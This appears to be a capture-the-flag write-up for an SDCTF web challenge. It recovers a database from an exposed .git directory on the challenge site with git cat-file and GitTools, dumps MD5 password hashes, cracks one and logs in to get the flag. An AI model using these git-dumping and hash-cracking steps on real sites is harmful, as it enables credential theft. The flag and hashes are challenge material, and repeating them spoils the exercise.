@@ -1,0 +1,66 @@
+http://cgau.sdc.tf/robots.txt
+	/admin.html
+	/.git/
+
+git log
+```
+commit 0b23360a5d79ecf5241fd6790edd619304825b9a (HEAD -> master)
+Author: Aaron <aaron@cgau.sdc.tf>
+Date:   Sat Jan 16 12:58:53 2021 -0800
+
+    Upgraded to bcrypt
+
+commit d8eb39e3e2bb984ce687768d20f58d962942841d
+Author: Aaron <aaron@cgau.sdc.tf>
+Date:   Sat Jan 16 12:52:49 2021 -0800
+
+    Initial commit
+```
+
+git cat-file -p d8eb39e3e2bb984ce687768d20f58d962942841d
+```
+tree 7e23e8d425a5f91a7f5e70d6c7cc6d7811db661d
+author Aaron <aaron@cgau.sdc.tf> 1610830369 -0800
+committer KNOXDEV <nick@knox.codes> 1610831041 -0800
+
+Initial commit
+```
+
+git cat-file -p 7e23e8d425a5f91a7f5e70d6c7cc6d7811db661d
+```
+100644 blob 21c3532b100a5f8566f5fc4c64f2a4486618a67e    .gitignore
+100644 blob a76c475d6b53daf7efe8396b494f5e09ab4abc91    admin.html
+100644 blob 9a55d593b0f12ff6f64a06094aa873690b8ceabd    app.js
+100644 blob aac42f1d66b35b027d9538cfb3252473b08f11cd    image1.png
+100644 blob ce86d86f4c3f5bd7a63136a2caaf76d57071d905    index.html
+100644 blob 20c9f02c6a89d4bdf1d6644b12e80e093bf63a3e    package-lock.json
+100644 blob 9596c8286bedc6214c91e3efc2876efd41c6301e    package.json
+100644 blob 32e65831b8ccdef0c8d181116c660e11233983f9    robots.txt
+100644 blob 84f191442c8479c4cbd67937b9cbe3df2038be63    users.db
+```
+
+git cat-file -p 84f191442c8479c4cbd67937b9cbe3df2038be63 > users.db
+
+sqlite3 users.db
+select * from users;
+```
+id          email              password
+----------  -----------------  --------------------------------
+1           aaron@cgau.sdc.tf  e04efcfda166ec49ba7af5092877030e
+2           chris@cgau.sdc.tf  c7c8abd4980ff956910cc9665f74f661
+3           yash@cgau.sdc.tf   b4bf4e746ab3f2a77173d75dd18e591d
+4           rj@cgau.sdc.tf     5a321155e7afbf0cfacf1b9d22742889
+5           shawn@cgau.sdc.tf  a8252b3bbf4f3ed81dbcdcca78c6eb35
+```
+
+crackstation
+	e04efcfda166ec49ba7af5092877030e => weakpassword
+
+Login /admin.html
+	sdctf{1298754_Y0U_G07_g00D!}
+
+
+
+======================== With GitTool ========================
+./gitdumper.sh http://cgau.sdc.tf/.git/ test
+./extractor.sh /home/lai/leo/web/GitTools/Dumper/test ./testdump
